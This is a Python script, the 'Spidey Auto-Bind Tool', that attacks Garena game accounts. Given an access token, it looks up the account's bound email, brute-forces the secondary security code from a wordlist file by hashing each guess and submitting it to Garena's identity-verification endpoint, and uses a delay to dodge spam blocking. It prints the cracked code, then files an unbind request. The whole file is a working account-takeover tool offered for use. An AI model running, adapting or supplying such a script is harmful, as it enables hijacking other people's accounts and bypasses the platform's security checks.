import requests
import os
import sys
import json
import time
import hashlib
import urllib.parse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    MAGENTA = '\033[95m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def draw_header(subtitle=""):
    clear_screen()
    spidey_logo = f"""{Colors.CYAN}
    ███████╗██████╗ ██╗██████╗ ███████╗██╗   ██╗
    ██╔════╝██╔══██╗██║██╔══██╗██╔════╝╚██╗ ██╔╝
    ███████╗██████╔╝██║██║  ██║█████╗   ╚████╔╝ 
    ╚════██║██╔═══╝ ██║██║  ██║██╔══╝    ╚██╔╝  
    ███████║██║     ██║██████╔╝███████╗   ██║   
    ╚══════╝╚═╝     ╚═╝╚═════╝ ╚══════╝   ╚═╝   {Colors.END}"""
    print(spidey_logo)
    print(f"{Colors.MAGENTA}●{'═' * 15} {Colors.WHITE}{Colors.BOLD}Spidey Auto-Bind Tool {Colors.END}{Colors.MAGENTA}{'═' * 15}●{Colors.END}\n")
    print(f" {Colors.GREEN}⊛ STATUS    : {Colors.WHITE}AUTOMATED MODE{Colors.END}")
    print(f"\n{Colors.MAGENTA}●{'═' * 48}●{Colors.END}\n")
    if subtitle:
        print(f" {Colors.CYAN}CURRENT OPTION : {Colors.WHITE}{subtitle}{Colors.END}")
        print(f"\n{Colors.MAGENTA}●{'═' * 48}●{Colors.END}\n")

def input_prompt(msg):
    return input(f"{Colors.CYAN}» {Colors.WHITE}{msg} : {Colors.END}").strip()

def automated_unbind_bypass():
    draw_header("AUTOMATIC UNBIND - SECURITY CODE BYPASS")
    
    # Check if HLO.txt exists
    if not os.path.exists("HLO.txt"):
        print(f" {Colors.RED}⊛ Error: 'HLO.txt' file nahi mili! Pehle is name se file banao.{Colors.END}")
        return

    access_token = input_prompt("Enter Access Token")
    if not access_token:
        print(f" {Colors.RED}⊛ Token empty nahi ho sakta!{Colors.END}")
        return

    # 1. Automate Option 3 (Get Bind Info internally to grab email)
    print(f"\n {Colors.MAGENTA}⊛ [1/3]{Colors.END} {Colors.WHITE}Fetching Bound Email automatically...{Colors.END}")
    try:
        url_info = "https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
        info_payload = {'app_id': "100067", 'access_token': access_token}
        info_headers = {'User-Agent': "GarenaMSDK/4.0.30"}
        r_info = requests.get(url_info, params=info_payload, headers=info_headers, timeout=10)
        email = r_info.json().get("email", "")
    except Exception as e:
        print(f" {Colors.RED}⊛ Error connecting to Garena: {str(e)}{Colors.END}")
        return
        
    if not email:
        print(f" {Colors.RED}⊛ Account par koi bound email nahi mila!{Colors.END}")
        return
        
    print(f" {Colors.GREEN}⊛ Bound Email Found: {email}{Colors.END}")

    # 2. Automate Option 2: Change via Security Code (Brute-forcing from HLO.txt)
    print(f"\n {Colors.MAGENTA}⊛ [2/3]{Colors.END} {Colors.WHITE}Reading codes from HLO.txt & attacking...{Colors.END}")
    
    with open("HLO.txt", "r") as f:
        codes = [line.strip() for line in f if line.strip()]

    headers = {
        "User-Agent": "GarenaMSDK/4.0.30",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json"
    }

    identity_token = None
    matched_code = None

    for code in codes:
        print(f" {Colors.YELLOW}» Testing Code: {code}...{Colors.END}", end="\r")
        
        # Hashing the code to SHA-256 as required by Garena API
        hashed_sec_code = hashlib.sha256(code.encode('utf-8')).hexdigest()
        
        verify_url = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"
        verify_data = {
            "email": email, 
            "app_id": "100067", 
            "access_token": access_token, 
            "secondary_password": hashed_sec_code
        }
        
        try:
            resp = requests.post(verify_url, headers=headers, data=verify_data, timeout=10)
            res_json = resp.json()
            
            if "identity_token" in res_json and res_json.get("identity_token"):
                identity_token = res_json.get("identity_token")
                matched_code = code
                break
        except Exception:
            pass
            
        time.sleep(0.2)  # Short delay to prevent heavy spam blocking

    print(" " * 40, end="\r")  # Clear the last testing line

    if identity_token and matched_code:
        print(f"\n {Colors.GREEN}█████████████████████████████████████████{Colors.END}")
        print(f" {Colors.GREEN}⊛ VERIFICATION SUCCESSFUL!{Colors.END}")
        print(f" {Colors.GREEN}⊛ CRACKED SECURITY CODE: {Colors.BOLD}{Colors.WHITE}{matched_code}{Colors.END}")
        print(f" {Colors.GREEN}█████████████████████████████████████████{Colors.END}")
        
        # 3. Final Step: Send the Unbind Request using the extracted identity_token
        print(f"\n {Colors.MAGENTA}⊛ [3/3]{Colors.END} {Colors.WHITE}Sending final Unbind Request...{Colors.END}")
        unbind_url = "https://100067.connect.garena.com/game/account_security/bind:create_unbind_request"
        unbind_data = {"app_id": "100067", "access_token": access_token, "identity_token": identity_token}
        
        try:
            final_resp = requests.post(unbind_url, headers=headers, data=unbind_data)
            print(f" {Colors.CYAN}⊛ Server Response: {final_resp.text}{Colors.END}")
        except Exception as e:
            print(f" {Colors.RED}⊛ Request failed: {str(e)}{Colors.END}")
    else:
        print(f"\n {Colors.RED}⊛ Identity verification FAILED! HLO.txt me se koi code match nahi hua.{Colors.END}")

    print(f"\n{Colors.MAGENTA}●{'═' * 20} SCRIPT EXITED {'═' * 20}●{Colors.END}\n")

if __name__ == "__main__":
    try:
        automated_unbind_bypass()
    except KeyboardInterrupt:
        print(f"\n\n {Colors.RED}⊛ Process interrupted by user. Exiting...👋{Colors.END}\n")